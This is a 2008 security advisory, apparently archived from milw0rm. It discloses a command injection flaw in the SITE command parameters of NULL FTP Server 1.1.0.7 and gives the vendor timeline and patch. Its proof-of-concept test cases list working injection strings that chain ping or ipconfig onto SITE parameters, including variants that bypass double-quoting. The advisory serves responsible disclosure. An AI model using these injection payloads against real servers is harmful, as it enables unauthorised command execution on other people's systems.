@@ -1,0 +1,163 @@
+vuln.sg Vulnerability Research Advisory
+
+NULL FTP Server SITE Parameters Command Injection Vulnerability
+
+by Tan Chew Keong
+Release Date: 2008-12-05
+
+Summary
+
+A vulnerability has been found in NULL FTP Server. When exploited, this
+vulnerability allows an authenticated user to execute arbitrary shell
+commands on the FTP server. In order to exploit this vulnerability, the
+FTP SITE commands must be enabled on the server and the SITE commands
+must be configured to accept parameters from the user.
+
+Tested Versions
+
+   * NULL FTP Server Free/Pro Version 1.1.0.7
+
+
+Details
+
+A vulnerability has been found in NULL FTP Server. When exploited, this
+vulnerability allows an authenticated user to execute arbitrary shell
+commands on the FTP server. In order to exploit this vulnerability, the
+FTP SITE commands must be enabled on the server and the SITE commands
+must be configured to accept parameters from the user.
+
+NULL FTP Server allows customised SITE commands to be defined in the FTP
+server, for example, to allow the user to run Windows shell commands
+like attrib, dir, etc. It supports the passing of parameters to the SITE
+commands so that the user can pass commandline arguments to the
+corresponding shell commands.
+
+Parameters are defined using the %readfile1, %writefile1, %1, %2, %3,
+%4, %5, %6, %7, %8, and %9 placeholders when creating the SITE commands.
+For example, to allow the user to use dir, it is possible to define the
+NATIVEDIR SITE command as dir %readfile1. Upon logon to the NULL FTP
+Server, the user can issue SITE NATIVEDIR test.txt to run dir test.txt.
+
+NULL FTP Server performs some validation checks on the parameters passed
+by the user to prevent command injection. See screenshot below:
+
+However, this validation check is insufficent and thus, cannot totally
+prevent the user from injecting arbitrary Windows shell commands.
+Enclosing the placeholders in double-quotes do not fully resolve the
+issue. Please use the POC instructions below to verify the
+vulnerability.
+
+POC / Test Code
+
+Please follow the instructions below to confirm the vulnerability on a Windows system.
+
+Prerequisites
+
+Please configure NULL FTP Server as follows prior to testing:
+
+  1. Create a test user on the NULL FTP Server.
+
+  2. Ensure that this user is given Full Access (i.e. read and write) to the FTP directory. This is required since the %writefile1 parameter requires the user to have write access to the FTP directory.
+
+  3. Configure NULL FTP Server to Enable SITE commands and click on Apply.
+
+  4. Download and extract netcat from here. netcat (nc.exe) will be used to issue FTP commands directly to NULL FTP Server.
+
+
+
+Test Case 1
+
+  1. Create the following SITE command in NULL FTP Server if it does not already exist.
+
+     Command Name: NATIVEDIR
+     Executable/batch file: dir %readfile1
+
+  2. Using netcat, logon to the FTP server and issue the following SITE command.
+
+     SITE NATIVEDIR "."\""&ping 127.0.0.1&
+
+     OR
+
+     SITE NATIVEDIR a&ipconfig
+
+  3. The above SITE commands will inject the ping or the ipconfig command. See screenshot below.
+
+
+
+Test Case 2
+
+The purpose of this test case is to show that enclosing the %readfile1 placeholder in double-quotes will not solve the issue.
+
+  1. Create the following SITE command in NULL FTP Server if it does not already exist.
+
+     Command Name: NATIVEDIR
+     Executable/batch file: dir "%readfile1"
+
+  2. Using netcat, logon to the FTP server and issue the following SITE command. Do note that this exploit is slightly different from Test Case 1.
+
+     SITE NATIVEDIR ".""\""&ping 127.0.0.1&
+
+  3. The above SITE command will inject the ping command. See screenshot below.
+
+
+
+Test Case 3
+
+  1. Create the following SITE command in NULL FTP Server if it does not already exist.
+
+     Command Name: ATTRIB
+     Executable/batch file: attrib %writefile1 %2 %3 %4 %5 %6 %7 %8 %9
+
+  2. Using netcat, logon to the FTP server and issue the following SITE command.
+
+     SITE ATTRIB a&& ping 127.0.0.1
+
+     OR
+
+     SITE ATTRIB a &ping 127.0.0.1
+
+     OR
+
+     SITE ATTRIB a| ping 127.0.0.1
+
+  3. The above SITE command will inject the ping command. See screenshot below.
+
+
+
+Test Case 4
+
+  1. Enclosing the placeholders in double-quotes will not solve the issue.
+
+     Command Name: ATTRIB
+     Executable/batch file: attrib "%writefile1" "%2" "%3" "%4" "%5" "%6" "%7" "%8" "%9"
+
+     Test Exploit: SITE ATTRIB a" &ping 127.0.0.1&
+
+  2. Again, enclosing the placeholders in double-quotes will not solve the issue.
+
+     Command Name: ATTRIB
+     Executable/batch file: attrib %writefile1 "%2" "%3" "%4" "%5" "%6" "%7" "%8" "%9"
+
+     Test Exploit: SITE ATTRIB a &"ping 127.0.0.1&
+
+  3. The above SITE commands will inject the ping command.
+
+
+
+
+Patch / Workaround
+
+Update to version 1.1.0.8. See vendor's release notes.
+
+Disclosure Timeline
+
+2008-11-25 - Vulnerability Discovered.
+2008-11-26 - Initial Notification Sent to Vendor (Support Ticket #20786).
+2008-11-26 - Initial Vendor Reply. Vulnerability details sent to vendor.
+2008-11-27 - Received vendor response that vulnerability has been fixed in version 1.1.0.8, and the fixed version has been released via online update.
+2008-12-05 - Public Release.
+
+Contact
+For further enquries, comments, suggestions or bug reports, simply email them to Tan Chew Keong.
+
+# milw0rm.com [2008-12-05]
